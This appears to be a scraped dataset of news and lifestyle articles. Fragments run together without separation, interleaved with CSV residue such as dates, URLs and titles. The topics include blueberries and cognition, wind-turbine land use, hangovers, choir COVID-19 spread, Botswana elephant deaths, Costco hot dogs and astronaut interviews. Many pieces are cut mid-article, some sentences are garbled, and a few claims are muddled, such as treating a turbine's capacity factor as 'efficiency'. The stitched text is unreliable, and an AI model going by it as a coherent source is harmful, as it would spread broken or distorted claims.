The results were clear: Those who had eaten wild blueberries (aka WBB) were able to maintain a sustained level of concentration and performance during the day in both sets of tasks, while those who had been given a placebo saw a decrease in performance as the day went on. Researchers also noticed that those in the wild blueberry group were faster in their correct responses than the placebo group.

""This study indicated acute cognitive benefits of [wild blueberry] WBB intake in cognitively healthy middle-aged individuals, particularly in the context of demanding tasks and cognitive fatigue,"" the study authors wrote.

This is far from the first study to find that wild blueberries provide bountiful brain benefits. A 2011 study published in The Journal of Agricultural and Food Chemistry significantly improved the memory performance of older adults who were at risk for Alzheimer's disease. And a study from 2007 found that regularly consuming wild blueberries could help alleviate cognitive decline in aging adults—most likely thanks to their anti-inflammatory properties.

Whether you're putting them in your morning oatmeal or simply taking them down by the handful as you run out the door, it sounds like there's plenty of science behind blueberries as a fantastic and healthy snack.6254a4d1642c605c54bf1cab17d50f1e

So, after looking at all the options and not wishing to change batteries, I opted for this solar-powered unit. It was a few dollars more, but it seems to be a well-designed unit. And, no changing dead batteries! I had it up and running in minutes. I used the included stainless-steel screws to attach it to a utility pole near our driveway. The device is pointed across the clearing of about forty feet where our driveway comes onto the property. I had to set it on high to read across that entire distance. The device is probably no more than 150 feet from the receiver, which I put out-of-sight on top of a kitchen cabinet in the house. It works perfectly.

Men's Health magazine recently put the question ""What's the first thing you notice about a man?"" to 200 women, and the results were really interesting!

Nearly a majority of women said that the first thing they notice in a man on the street is his eyes. I am a woman, so I feel I have some authority on the matter, and I would agree with the eye thing!

For anyone really hoping to improve their chances with the opposite sex, they also included the top five things, after eyes, that women notice.

In order it goes, eyes, smile, height, hands and style.

After all that quizzing, the magazine also showed each woman a picture of a man in a Speedo and asked what caught their eye first. The main responses were abs, face and shoulders/biceps.

So if you want to get the girl of your dreams, just look her in the eye. Don't be too intense about it though ... that never ends well.

Here's How Much Of The US Would Need To Be Covered In
Wind Turbines To Power The Nation
",1/10/2020 9:04,https://www.iflscience.com/technology/heres-how-much-the-us-would-need-to-be-covered-in-wind-turbines-to-power-the-nation/,"The US District Court of Appeals in Washington, DC, will hear arguments this Tuesday over the Obama administration's Clean Power Plan, which dictates carbon-cutting standards for states based on their greenhouse-gas emissions.

The Supreme Court put a hold on enforcement of the plan in February to allow legal challenges to it to be resolved in court. If the Court of Appeals rules that the government can legally enforcement the plan, the country will have to start using a lot more renewable energy (like wind and solar) — and much less coal — by the year 2030.

Part of the plan calls for the creation of incentives to encourage states to build wind farms. Though the US invested $14.5 billion in wind-power project installations last year, wind farms still provide less than 5% of the nation's energy, according to the American Wind Energy Association.

But what would a US powered only by wind actually look like?

To answer that question, AWEA's manager of industry data analysis, John Hensley, did the following math: 4.082 billion megawatt-hours (the average annual US electricity consumption) divided by 7,008 megawatt-hours of annual wind energy production per wind turbine equals approximately 583,000 onshore turbines.

In terms of land use, those 583,000 turbines would take up about the total land mass of Rhode Island, Hensley says, because wind projects typically require 0.74 acres of land per megawatt produced.

Jorge Luis Plata/REUTERS

To make his calculation, Hensley considered that the average wind turbine has an output of 2 megawatts of power and is 40% efficient. That means it can reach its full power-generating potential 40% of the time, since wind is not always blowing and farms sometimes shut down for routine maintenance. That percentage also accounts for constraints to the electrical grid — if an electrical grid receives more power from a wind farm than it can handle, for example, managers will turn off a few turbines.

Forty percent is actually pretty efficient, Hensley says. For comparison, solar projects operate at an average of 20% efficiency, and fossil-fuel production facilities operate at 40% to 60% of their full capacity on average.

When you multiply a wind turbine's average potential (2 megawatts) by its 40% annual energy efficiency, 365 days a year, you get Hensley's estimate of the megawatt-hours of energy production each turbine can produce (7,008).

Thanks to technological advancements in wind turbine technology, the cost of deploying wind energy has fallen by 90% since the 1980s.

Chris New

Wind turbines can also now be built taller and larger than ever, allowing them to harness more power than in years past, Hensley says. Offshore wind farms, in which turbines are installed in oceans rather than on land, can offer about 33% more power than onshore ones, since there is more wind blowing over the sea than on land.

Of course, installing more than half a million turbines across the US would be a moonshot project, even with the recent cost reductions. But investing in more renewable energy — so that we're less dependent on fossil fuels — is certainly a worthy goal.

Hangovers are interesting son of a bitches that always tend to hit me where it hurts most. The delayed hangover strikes on Monday morning when you really don't need that little shit hanging from your head while you prepare your body into working mode again.

The only thing worse than a hangover are the imaginative hangover cures that never seem to work. So far, I've tried raw egg, downing milk (that wasn't a pretty sight), pure orange juice, clean breakfast, greasy breakfast. You name it, I've tried it.

Someone suggested downing three cans of full-fat coke once, but that's problematic because, you know, I don't wanna die when I'm 34.

Advert 10

So, in a change of tactics, what about if I could have just as much fun in the evening and NOT have to suffer the next day? Well, it's all in the drink, apparently.

Why is it that, besides getting shit-faced, each drink has a different, but equally as grim side effect? Gin, for example, is mother's ruin. If you start crying around me on a night out, the only thing that you'll hear me saying is, 'put the gin down'. Vodka on the other hand makes some of my friends aggressive. Interestingly, it's always the quiet ones who go bat-shit crazy on cheap vodka. Wine, enough about that said, the better. Who orders wine on a night out?

And, lager creates this:

All of which, especially combined, still result in hangovers.

Advert 10

So, stereotypes aside, wouldn't it be great for there to be a drink that is actually going to save your mother of all headaches in the morning.

Well, according to the Daily Star, a team of fitness professionals have concluded that tequila, blanco tequila to be specific, is in fact the best drink to choose if you don't react well to hangovers.

This is because the alcohol is made from 100 percent agave, a Mexican plan, and is void of sugar and corn syrup that adds solid flavour but is your worst enemy the day after the night before.

""As long as you stay hydrated and don't drink, like, a whole bottle, you're fine. Not hungover,"" says Jason Eisner, director at Hollywood's trendy vegan bar-restaurant Gracias Madre.

Doing this innocent activity indoors can speed up the
spread of COVID-19 dramatically

",28/09/2020 12:58,https://www.theladders.com/career-advice/doing-this-innocent-activity-indoors-can-speed-up-the-spread-of-covid-19-dramatically,"A recent peer-reviewed study revealed one of the quickest and easiest ways to spread COVID-19: singing indoors, without a mask on.



The study, published in Indoor Air, confirmed what was already suspected after a choir rehearsal in early March became one of the first superspreading events in the US.



On March 10 in Skagit Valley, Washington, 61 people attended their regular 2.5-hour choir practice. One choir member admitted to showing flu-like symptoms prior to attending the rehearsal that evening. In the following weeks, 53 people who attended the rehearsal fell ill and tested positive for COVID-19. Of those, three people were hospitalized and two died.



Even though the attendees were careful not to touch each other and sanitize their hands, most of them still got sick. This was believed to be caused by the transmission and buildup of aerosols, which can increase through acts of talking loudly or singing, especially indoors. The recent study, led by professor of mechanical engineering Shelly Miller, verifies that.



“This study documents in great detail that the only plausible explanation for this superspreading event was transmission by aerosols,” Miller said. “Shared air is important because you can be inhaling what someone else exhaled even if they are far away from you.”



According to the researchers, there is not enough reason to believe that droplets and infected surfaces were responsible for transmitting the virus. For so many people to be infected in a short span of time, the virus must have been airborne somehow.



“The inhalation of infectious respiratory aerosol from ‘shared air’ was the leading mode of transmission,” study co-author Jose-Luis Jimenez said.



Additional research already speculated on the likelihood of COVID-19 transmission via aerosols. According to Miller, singing is known to produce high amounts of aerosols — more than whispering or talking at a normal volume.



“You have the air that’s coming out on your respiratory tube, your mouth, and your nose, and there’s some liquid that’s lining all of your respiratory system,” Jimenez explained. “And when the air is going very quickly, it can basically grab a little bit of that material and put it in a particle, and then you expel it out into the air. That’s what happens. So anything that makes the air go faster or more strongly or produce more air is putting out more respiratory particles. If you’re singing, you’re breathing in a lot of air, you’re breathing out very forcefully, and you’re also moving your vocal cords. The vocal cords are wet, they’re covered in this fluid, they’re vibrating, and that can also produce more particles.”



Not only this, but the likelihood of virus transmission only increases in an indoor setting, where the aerosol particles are trapped, making it almost impossible not to breathe in the virus.



Researchers noted that a 30-minute rehearsal, rather than a 2.5-hour one would have reduced the rate of infection from 87% to 12%.



For now, the study authors are recommending that choral directors move their rehearsals outdoors, if possible, as well as requiring all those attending to wear masks and stand 6 feets apart. However, the safest option would be to avoid singing in groups at all for a while, especially if getting outside isn’t an option for you.



“What we’re recommending right now is definitely staying six feet apart with masks, with good ventilation, in very short duration of 30 minutes, with breaks to air out the room,” Miller said.



The Center for Disease Control and Prevention (CDC) supported this conclusion and originally issued a report stating that group singing events were considered high-risk and increased chances of transmission. However, that language was later removed from CDC guidelines, due to political concerns.



However, experts say that the virus still needs to be taken seriously, and the recent findings in this study support that.



“[Group singing remains] extremely dangerous and irresponsible,” Jimenez said. “The research adds to the overwhelming body of evidence that aerosol transmission is playing a major role in driving this pandemic and especially to superspreading events.”



Dr. James Hamblin offered The Atlantic this simple advice to be considerate of others:



“A general rule for minimizing the spread of any respiratory virus: Silence is safer than whispering. Whispering is safer than talking. Talking is safer than singing.”

",28/09/2020 8:16,https://abcnews.go.com/International/350-suddenly-collapsed-died-scientists-now-explanation/story?id=73162610,"The mystery surrounding hundreds of sudden elephant deaths in Botswana seems to have been solved and the findings bring an end to months of speculation on why at least 330 elephants were found dead in the northwestern region of the Southern African country earlier this year.

Initially, possible explanations over the deaths had ranged from poaching to anthrax to poisoning. Now, however, the country has pointed to toxic blooms of cyanobacteria, a naturally occurring neurotoxin and biological phenomenon which has increased due to climate change, according to Mmadi Reuben, principal veterinary officer at the Botswana department of wildlife and national parks.

“As in so many other situations, such as the wildfires in California and Oregon and the floods in the U.K., climate change is the threat multiplier,” Dr Niall McCann, co-founder of U.K.-based charity National Park Rescue, told ABC News. “Climate change and the effect of global warming on the region is increasing both the intensity and severity of harmful algal blooms, making this issue more likely to reoccur.”

“Our latest tests have detected cyanobacterial neurotoxins to be the cause of deaths. These are anaerobe bacteria found in water of seasonal water pans” Mmadi Reuben told ABC News by phone from Gaborone, the country’s capital.

They spent months studying samples from the carcasses, environmental samples from soil and water as well as samples from the live animals and sent them to specialized regional laboratories as well as laboratories in the U.S., Canada and Europe, according to Reuben.

Most carcasses, spotted by aerial surveys, were found clustered around water sources close to the Okavango Delta which, in normal times, is a major tourist safari destination. Some animals were even seen walking dizzily in circles before suddenly dying.

“The unexplained deaths ceased as these seasonal waterholes and water pans dried up in late June, the beginning of our fall,” Reuben explained. “We have a number of hypotheses we are investigating.”

With the exception of one horse, other animal species were not affected by the blue-green algae phenomenon.

“One working hypothesis is that, unlike other animals, elephants suck water with their trunks from underneath, so they drink from deeper levels in the waterholes, closer to silt where the anaerobe toxins are contained,” Reuben explained.

Although there are no official indications that the Botswana elephant deaths might be linked to the unresolved deaths of more than 20 elephants near Hwange, a national park in neighboring Zimbabwe, in August, McCann believes a common denominator is climate change.

“Climate change is the ultimate cause, even if the proximate cause is something different,” claims McCann. “These type of things are only going to become more common, more frequent and the issue of warming waterholes is going to become worse and worse in time.”

Because of climate change, Southern Africa’s temperatures are rising at twice the global average, according to CSAG, one of the leading climate research groups in Africa.

Botswana is home to about 130.000 elephants -- the world's largest elephant population -- with more than a third of Africa's elephants, according to the latest Great Elephant Census, which Reuben's colleagues at the Department for Wildlife and Natural Parks helped produce. It is also one of the most stable countries in Africa with one of the best wildlife records. Tourism accounts for a fifth of Botswana's GDP.

“The important thing is that investigations continue into why this happened so that going forward we can stop this from happening again in time,” concluded Reuben. “The country is already engaged in development of monitoring plan aimed at detecting the blooms early in the water before they cause harm to the animals and taking necessary precautions,”",Over 330 elephants suddenly collapsed and died.

""SARS-CoV-2 is transmitted via hands and fomites, respiratory droplets and aerosol, including transmission by superspreading events where large numbers of individuals are infected by a single person, almost invariably in closed crowded settings.' This is why Dr. Fauci has long been saying: ""Avoid crowds.""

On Why the Virus is So Brutal

""Unimagined just a few short months ago, the ongoing COVID-19 pandemic has upended our entire planet, quickly challenging past assumptions and future certainties. It possesses simultaneously three characteristics that have allowed it to render an historic assault on the human species, triggering a virtual global 'lockdown' as the only weapon against uncontrolled spread. It combines the characteristics of being a virus that to our knowledge has never before infected humans in a sustained manner, together with its extraordinary efficiency in transmitting from person to person and its relatively high level of morbidity and mortality, especially among seniors and those with underlying co-morbidities. It indeed is the perfect storm of an emerging infectious disease.""

On Why We Must Take Control of the Virus

""First, in the immediate sense, it is important to mitigate spread of infection, illness, and death. Second, it is critical to prevent the persistence of microbes that may lead to additional emergences that are cumulatively as deadly, or more so, than the original emergences. That viral genetic descendants of the 1918 influenza pandemic virus are still causing seasonal outbreaks throughout the world, and still killing cumulatively millions of people a century later, is a powerful reminder that single disease emergences can have consequences beyond immediate morbidity and mortality. In the ancient ongoing struggle between microbes and man, genetically more adaptable microbes have the upper hand in consistently surprising us and often catching us unprepared.""

At some time in the future we will be better able to compare and contrast COVID-19 to other important emerging diseases; however, at this time we are still just entering a steep learning curve that will surely keep surprising us as we struggle to control what is already among the deadliest pandemics of the past century.""

On How to Limit Future Pandemics

""Living in greater harmony with nature will require changes in human behavior as well as other radical changes that may take decades to achieve: rebuilding the infrastructures of human existence, from cities to homes to workplaces, to water and sewer systems, to recreational and gatherings venues. In such a transformation we will need to prioritize changes in those human behaviors that constitute risks for the emergence of infectious diseases. Chief among them are reducing crowding at home, work, and in public places as well as minimizing environmental perturbations such as deforestation, intense urbanization, and intensive animal farming. Equally important are ending global poverty, improving sanitation and hygiene, and reducing unsafe exposure to animals, so that humans and potential human pathogens have limited opportunities for contact.""

""There is nothing new about this situation, except that we now live in a human-dominated world in which our increasingly extreme alterations of the environment induce increasingly extreme backlashes from nature….We remain at risk for the foreseeable future. COVID-19 is among the most vivid wake-up calls in over a century. It should force us to begin to think in earnest and collectively about living in more thoughtful and creative harmony with nature, even as we plan for nature's inevitable, and always unexpected, surprises.""

Given that we use them to dry parts of our body that we've just given a good wash, you could be forgiven for thinking that you can get away with a once weekly wash - or perhaps even less, for some.

So how often should I wash my towels?

It seems that we should actually be washing our towels much more regularly than that, according to the experts.

Philip Tierno, a microbiologist at New York University School of Medicine, revealed that a towel - even if it's properly dried - shouldn't be used more than three times.

He explained to Tech Radar, “If you can dry it completely, no more than three times max. A damp towel is growing.

""Wherever there is odour, there are microbes growing so it should be washed.”

Towels should be cleaned regularly to avoid drying yourself off with a towel that's full of growing bacteria - yuck.

Dr. Gerba, a microbiologist, also told Time US, “After about two days, if you dry your face on a hand towel, you’re probably getting more E. coli on your face than if you stuck your head in a toilet and flushed it.” Pretty gross, right?

And it seems they're alone in her estimations.

Cleaning expert with Fantastic Service Ralitsa Prodanova, agrees that we should be washing our towels after every three or four uses - which, for people who shower daily, is every three or four days.

She told metro.co.uk, ""If you get a musty smell when you bring the towel up to your nose, that’s bacteria growing on the towel itself. And because towels are often warm and damp, they’re the perfect breeding ground for bugs and germs.""

So is this what most people are doing?

According to a 2018 GE Appliances poll, taking in results of over 1,500 people, 50% said they'd actually use a towel five times before washing it.

But, a further 14% of respondents said they'd use a towel eight times or more before they washed it.

Here's why fans aren't happy about Nintendo's ‘Super
Mario 3D All-Stars’
",27/09/2020 11:12,https://www.altpress.com/news/nintendo-super-mario-3d-all-stars-release/,"It’s the 35th anniversary of Super Mario Bros. and Nintendo is definitely in the mood to celebrate.

On Thursday, the company dropped a surprise video announcing various game remasters, the launch of older Mario games for Switch and even a new Mario battle game. However, some fans aren’t too happy about how Nintendo has chosen to release these new games.

Nintendo has announced the new Super Mario 3D All-Stars collection which includes Super Mario 64, Super Mario Sunshine and Super Mario Galaxy. The entire collection is available starting Sept. 18 for Switch. As well, Nintendo has announced a new digital-only Mario-themed battle game which allows players to compete in Super Mario Bros. against 35 other players. This game launches on Oct. 1.

Fans, however, are going to have to act quickly to get their hands on these new releases. Nintendo has decided that the games will only be available for a limited time. So, by Mar. 31, 2021, all of these new games will be gone.

Three Mario adventures in one collection jump on to #NintendoSwitch! With HD visuals, take Super Mario 64, Super Mario Sunshine, and Super Mario Galaxy on the go in #SuperMario3DAllStars.

Naturally, the limited release took fans by surprise. While some are confused about why Nintendo would choose to only make these games available for a limited time only, others are just annoyed.

Since the company’s announcement, fans have started referring to the Super Mario 3D All-Stars limited release move as “Disney Vaulting.” The phrase is in reference to Disney’s practice of re-releasing films for a limited time before making them unavailable again.

On Thursday, many Nintendo players began tweeting about the company’s decision.

This is why Costco's Hot Dog combos really cost $1.50
",26/09/2020 19:13,https://www.mashed.com/150302/this-is-why-costcos-hot-dog-combos-really-cost-1-50/,"This Is Why Costco's Hot Dog Combos Really Cost $1.50

Legions of Costco fans pony up their annual membership fee each year to take advantage of the bulk retailer's incredible deals on everything from 128-ounce jars of Hellmann's mayonnaise, to deeply discounted magnum bottles of surprisingly drinkable house brand champagne. But the true Costco fanatics know that a big part of the wholesale club giant's success comes a quarter pound at a time, and is served at the Costco food court: The legendary hot dog and 20 ounce soda combo, which clocks in at a wallet-pleasing $1.50.

It's one of the best bargains in quick-service food, but how did this ridiculously good deal get its start? It all began in 1984, when Hebrew National set up a cart outside of a Costco location in San Diego, in an attempt to lure in hungry customers, exhausted from hoisting 50-pound bags of dog food into their Costco shopping carts. The combo was an immediate success, and the price has remained unchanged for over 30 years, since 1985.

What drives ordinarily profit-hungry executives to keep the price for the hot dog and soda combo so impossibly low? After all, Costco actually loses money on every single combo sold, which adds up to around 135 million hot dogs per year. Tweaking prices, even a little, could dramatically impact the company's bottom line.

According 425Business, when Costco CEO W. Craig Jelenik complained about keeping a loss-leader like the hot dog combo on the menu to Costco co-founder Jim Sinegal, Sinegal made his opinion on the matter abundantly clear.

""I came to (Jim Sinegal) once and I said, 'Jim, we can't sell this hot dog for a buck fifty. We are losing our rear ends,'"" Jelenik explained. ""And he said, 'If you raise the effing hot dog, I will kill you. Figure it out.' That's all I really needed. By the way, if you raised (the price) to $1.75, it would not be that big of a deal. People would still buy (it). But it's the mindset that when you think of Costco, you think of the $1.50 hot dog (and soda).""

Why such an impassioned commitment to hot dog pricing? There are a few reasons. First, Costco is making a strategic choice to lose a few pennies on every hot dog combo sold, because it draws people into the store where they may be tempted to drop $1,400 on an outdoor patio set, or $2,500 on a riding lawn mower. A single customer who comes for the hot dogs but stays for the big screen television wipes out the loss on a few thousand hot dogs in just one transaction.

But there's another reason to keep prices low, and the food court humming with activity: A warm, family-friendly atmosphere creates excitement, and all of that action in the food court can be enough to lure in even more additional shoppers, as well as inspire existing customers to keep renewing their annual memberships.

Keeping the hot dog and soda combo at such a ridiculously low price hasn't always been easy, and has required some changes to product sourcing along the way. In 2013, Costco switched from serving Coca Cola products to Pepsi products, partly in an effort to keep costs low and maintain the hot dog combo's $1.50 price point. But there was an even more dramatic change even earlier, in 2009, when the company stopped serving Hebrew National brand all-beef kosher hot dogs, and instead established their own manufacturing facilities to produce the hot dogs in-house.

""What we figured out we could do is build our own hot dog-manufacturing plant (in Los Angeles) and make our own Kirkland Signature hot dogs,"" explained Jelenik. ""Now we are doing so much hot dog business that we've opened up another plant in Chicago.

Though the change sent shock waves rippling through Costco food courts nationwide, the change not only helped keep the price at $1.50, but ultimately may have resulted in an even better product. According to Costco, the house-manufactured Kirkland brand hot dogs now served at every food court are ""10 percent heavier and longer than the old,"" and they're a better quality hot dog.

""By having the discipline to say, 'You are not going to be able to raise your price. You have to figure it out,' we took it over and started manufacturing our hot dogs. We keep it at $1.50 and make enough money to get a fair return.""

In the 2009 edition of Costco Connection, David Fuller, the assistant vice president of publishing, clarified the rationale for keeping the combo priced at $1.50 even further. He says that Costco was committed to showing that ""a business can operate on a fair markup and still pay all of its bills.""

""Holding a price that steady for that long sends a clear message about what is possible when you decide to operate your business model on a 'cost plus' basis instead of a 'what the market will bear' basis,"" Fuller wrote.

In spite of technically losing money on every hot dog sold, the $1.50 combo is probably here to stay. It keeps customers coming back again and again, and indirectly translates to big business for the retail giant. We think journalist Eric Schaefer summed up the deal best, in his article for the Phoenix Sun Times: ""What's more American than buying 24 rolls of toilet paper, 64 ounces of mayonnaise, a case of beer, a few racks of ribs from the butcher, and throwing down a hot dog on the way out? Simply put: nothing. And as a bonus, you can also buy enough antacid to last a lifetime.""",This Is Why Costco's Hot Dog Combos Really Cost $1.50,

But when they thought back to their favorite items from their own registry, the one they couldn’t get out of their heads was one they hadn’t asked for — and actually hadn’t opened yet.

We'd say, 'We think this is a mountain, but maybe it's a molehill. Maybe we don't need it yet,'"" said Gunn. Courtesy of Kathy Gunn

Kathy Gunn’s great-aunt Alison, a “surrogate grandmother” figure to whom Gunn is quite close, had presented them with a mysterious box marked “Do not open until first disagreement.”

RELATED: How to find lifetime love: 10 secrets from couples married for decades

Since Alison and her husband, Bill, had been married nearly half a century until he passed away in 2004, the Gunns assumed the box held some sort of profound secret — perhaps a heartfelt letter about struggles the older couple had faced and how they had overcome. “We didn’t want to ruin the importance of taking that in by opening it after a silly fight,” Kathy Gunn told TODAY.

""The box became a running joke with our family,"" said Gunn. ""My mom became concerned a year or two ago that there could be food inside ... I had to call Aunt Alison to confirm there wasn’t anything perishable!"" Courtesy of Kathy Gunn

Nine years into their marriage, the Gunns had long passed their first disagreement — but the box remained wrapped in the closet.

“When you first get married, there are growing pains: learning how to live with someone else, finding out their crazy quirks,” Gunn explained. “The issues change depending on how long you’ve been married and what’s gong on in your life … first you fight about about picking up clothes off the floor, then later you fight about not getting sleep because of colicky babies.”

She continued, “Problems evolve over time. When we would think about the box, we would keep that in mind. We’d say, ‘We think this is a mountain, but maybe it’s a molehill. Maybe we don’t need it yet.’”

Fast forward to that May 2016 brainstorming session. “We were talking about the gifts we had cherished … I looked at my husband and said, ‘We still have that box,’” recalled Gunn. “He said, ‘If we’ve made it this far, I don’t think we need the box to save us.’”

They decided to open it ... and burst out laughing when they saw what was inside.

Wine glasses, candles, and money for flowers and pizza. (Time-tested tricks, to be sure.)

""We thought there would be a long, heartfelt letter about the struggles (Alison and her husband, Bill) had faced,"" said Gunn. Courtesy of Kathy Gunn

But over those nine years, the box had come to mean much more: Its very existence helped the Gunns keep their perspective and work through issues that could have otherwise broken them. ""It really forced us, every time we had a disagreement, to think about the bigger picture and ask, 'Is it really that big of a deal?'"" said Gunn.

Related: Bride and groom ask guests to commit random acts of kindness as wedding gifts

She felt compelled to write about the box and published a personal essay to the Love What Matters Facebook page. ""It was kind of a way to thank aunt Alison for helping us out the last nine years,"" she explained

It turns out the great-aunt wasn't the only one touched by Gunn's words. The essay went viral, and Alison actually heard about it through friends before Gunn got a chance to send it. ""She was flabbergasted!"" said Gunn. ""And tickled. She thinks that it’s the funniest and the cutest thing, because she can’t believe we even hung onto it for that long.""

""We did act on her advice!"" said Gunn. ""We took a little vacation to Nashville for our 9th anniversary."" Courtesy of Kathy Gunn

Gunn is thrilled her message has hit its mark. ""I hope it will inspire people to reassess their situations and think about their love — why they got married in the first place,"" she said.

This is what an astronaut craves after 9 months in space

",21/02/2020 13:15,https://nypost.com/2017/09/01/this-is-what-an-astronaut-craves-after-9-months-in-space/,"CAPE CANAVERAL, Fla. — After 9 ½ months in orbit, what’s on Peggy Whitson’s wish list? Will the record-setting NASA astronaut miss anything about space life?

Whitson was scheduled to answer reporters’ question during her final news conference from space this week, days before her scheduled return to Earth. But it was called off because of Harvey: Houston is home to Johnson Space Center and Mission Control for the International Space Station.

Instead, NASA relayed questions from The Associated Press to Whitson by email.

The questions and answers have been edited and condensed.

Q: What are your thoughts as you get ready to close out your mission? Has the flight hurried by or seemed to have dragged?

A: Actually, most of the flight has gone by very quickly. In fact, I would say that it didn’t feel any longer than my previous two flights of 6 months in duration. I would say the slowest time has been the last week or so. I think it has to do with switching in your mind where you want/need to be. Once the switch is thrown to go home, time seems to move a lot slower.

Q: You will be arriving back to a storm-crippled Houston. How has the catastrophe there affected your mindset? How did you and your husband’s home fare?

A: Our home is fine, but so many friends and co-workers have been impacted. For example, in order to keep Mission Control running, the team (three shifts of a skeleton support crew) were sleeping on cots in the backup Mission Control rooms. Their sacrifices for the station and keeping things running up here are amazing. Any trepidations I might have about returning in the aftermath of a hurricane are entirely eclipsed by the all those folks keeping our mission going and physically putting themselves out there to help folks who were less fortunate than us.

Q: Besides family and friends, what have you missed most about Earth?

A: Flush toilets. Trust me, you don’t want to know the details. Pizza has been on my mind for a month or two, since (U.S. astronaut) Jack (Fischer) told the ground we weren’t a pizza delivery place when he was joking with them.

Q: What will you miss most about space?

A: Things I will miss: I know that I will hugely miss the freedom of floating and moving with the lightest of touch, especially those first few days after my return when gravity will especially SUCK. I will miss seeing the enchantingly peaceful limb of our Earth from this vantage point. Until the end of my days, my eyes will search the horizon to see that curve.

I will miss seeing and working within this awe-inspiring creation that we, as a people, have constructed here in space, travelling at 17,500 mph. I still can’t believe the incredible level of detail that was required to imagine this place, let alone to build it! I will also miss the ability to “go for a walk” in a spaceship built for one.

And mostly, I will miss that incredible sense of satisfaction, gratitude and pride that comes from working with the NASA team from on orbit.

Q: You broke quite a few records on this mission. What are your thoughts about being a space superwoman?

A: I have noted in more than a few interviews that I am not overly comfortable with the praise about the records. I honestly do think that it is critical that we are continuously breaking records, because that represents us moving forward in exploration. I am working on paying forward some of the advice and mentoring that I received on my journey, in hopes that one day those young people will do the same, and look back on a life in which they leapt at the opportunities and broke their own records.

Q: How much longer could you envision yourself staying up there, if you had to? An entire year? Longer?

A: Yes, I do think I could have flown in space longer. The resistive exercise device is much better than the previous versions, and does a fantastic job of keeping us fit from a bone and muscle perspective.

Q: Is this your last spaceflight, in all likelihood? What’s next for you?

A: I am not sure what the future holds for me personally, but I envision myself continuing to work on spaceflight programs. My desire to contribute to the spaceflight team as we move forward in our exploration of space has only increased over the years.",This is what an astronaut craves after 9 months in space,

After learning about Bryant’s death, O’Neal said he called friends whom he still had disagreements with to put an end to any lingering conflicts.

“Look, I’m all about being hard and all that, but after yesterday, I’m going to have to delete my beef and my confrontation clause,” O’Neal said during an episode of his podcast, “The Big Podcast with Shaq,” recorded. “I don’t want to do that anymore because, you know, you never know.”

Bryant and O’Neal famously had a long-standing feud while playing together on the Los Angeles Lakers during the late ’90s and early ’00s that they eventually put aside on an episode of O’Neal’s podcast in 2015.

The two had a loving but contentious and competitive relationship, trading barbs (before quickly making up) as recently as August 2019.

“So yesterday I just called all the people I had discrepancies with and just said, ‘Look man, I love you.’ And we didn’t talk much after the phone, but I just — I just wish we did,” he added, not naming who he spoke with. “You know, we’re sort of like similar guys, hey, family first, business, and I’ll see you when I see you. I have a lot of best friends, but I don’t do the mushy talking on the phone thing.”

O’Neal said in addition to those he called to settle conflicts with, he also called his best friend and made a promise to check in on his other friends more.

Speaking with palpable pain in his voice, the basketball great added that he’s “not sleeping, not eating, not really functioning,” as he just lost his sister Ayesha Harrison-Jex to cancer in October 2019, and he’s now hurting over the loss of his “brother,” Bryant.

When O’Neal reflected on what he would’ve done differently with Bryant, he said, “I wish I would’ve communicated more. But again, that’s just how we are.”

“When we saw each other it was love and respect and he looked out for the kids and I kept an eye on his daughter Gigi ― she was a fabulous player,” he said. “I just wish I could’ve talked to him like before. That’s it. Everything that happened, happened.”

On the podcast, O’Neal said he refused to believe the news of Bryant’s death was real, initially thinking that it was a hoax. He was working out with his sons, Shaqir and Greg, when Greg showed him a clip from TMZ.

“I figured someone was just playing around. I didn’t want to believe it. And everyone’s calling me, ‘Is it true? Is it true?’ So, I’m like, it must not be a hoax because now the whole world knows this information. So now I’m saying, ‘Please don’t be true. Please don’t be true. Please don’t be true,’” O’Neal said.

“And I’m watching. And then you get the confirmation. And sad enough, then you hear his daughter was with him. I didn’t do anything,” he added. “I haven’t eaten. I haven’t slept. I’m looking at all the tapes. But, I’m sick right now. ”

Surprising food NASA astronaut craved after record 11 months
in orbit
",29/01/2020 12:18,https://nypost.com/2020/01/28/this-is-what-astronaut-christina-koch-craved-after-record-11-months-in-orbit/,"CAPE CANAVERAL, Fla. — After nearly 11 months in orbit, the astronaut holding the record for the longest spaceflight by a woman can’t wait to dig into some salsa and chips, and swim and surf in the Gulf of Mexico.

NASA astronaut Christina Koch told The Associated Press on Tuesday — her 319th consecutive day in space — that taking part in the first all-female spacewalk was the highlight of her mission. She’s been living on the International Space Station since March and returns to Earth on Feb. 6, landing in Kazakhstan with two colleagues aboard a Russian capsule.

Koch said she and fellow astronaut Jessica Meir appreciated that the Oct. 18 spacewalk “could serve as an inspiration for future space explorers.”

“We both drew a lot of inspiration from seeing people that were reflections of ourselves as we were growing up and developing our dreams to become astronauts,” Koch told The Associated Press from the space station.

“So to recognize that maybe we could pay that forward and serve the same for those that are up and coming was just such a highlight.”

Koch’s astronaut class of 2013 was split equally between women and men, but NASA’s astronaut corps as a whole is male-dominated. Right now, four men and two women are living at the space station.

“Diversity is important and I think it is something worth fighting for,” said Koch, an electrical engineer who also has a physics degree.

Koch’s 328-day mission will be the second-longest by an American, trailing Scott Kelly’s flight by 12 days. She’s already set a record for the longest single spaceflight by a woman.

She took time out for a pair of news interviews Tuesday, the 34th anniversary of the space shuttle Challenger accident that claimed all seven lives on board.

She said she loves her work — she conducted five spacewalks and tended to science experiments — but she also misses her friends and family.

“If they could visit here, I would continue staying for a very long time,” Koch, a first-time space flier, told the AP. “For their sake, I think that it’s probably time to head home.”

Her biggest surprise is how easily and quickly she adapted both mentally and physically to weightlessness.

“I don’t even really realize that I’m floating anymore,” she said.

Why do chips and salsa top her most-missed food list? Crunchy food like chips are banned on the space station because the crumbs could float away and clog equipment. “I haven’t had chips in about 10 1/2 months,” she explained, “but I have had a fresh apple” thanks to regular cargo deliveries.

Another thing she misses: the ability to put things down and not have them float away.

She’s gotten used to using Velcro and tape to make things stay put, “so I hope that when I go back to Earth, I don’t accidentally drop things, especially when I’m handing them to people.”

Kelly, whose mission spanned 2015 and 2016, has given her advance notice of what to expect.

“It’s a great reminder to keep mentoring,” Koch said. When her record is broken, “I hope to mentor that person just as I’ve been mentored.”

Koch said it was crucial staying connected to loved ones through phone calls and video conferences. She watched as her nieces and nephews opened their Christmas presents. But it’s also special celebrating holidays in space, she noted, which “kind of takes any sting off of missing your family.”

Koch grew up in Jacksonville, North Carolina and now lives near the Gulf of Mexico in Galveston, Texas with her husband, Bob. She said she can’t wait for their next wedding anniversary, Christmas at home and his birthday.

Her 41st birthday is Wednesday. How does she plan to celebrate?

Justin Bieber Goes Public With Surprise Diagnosis

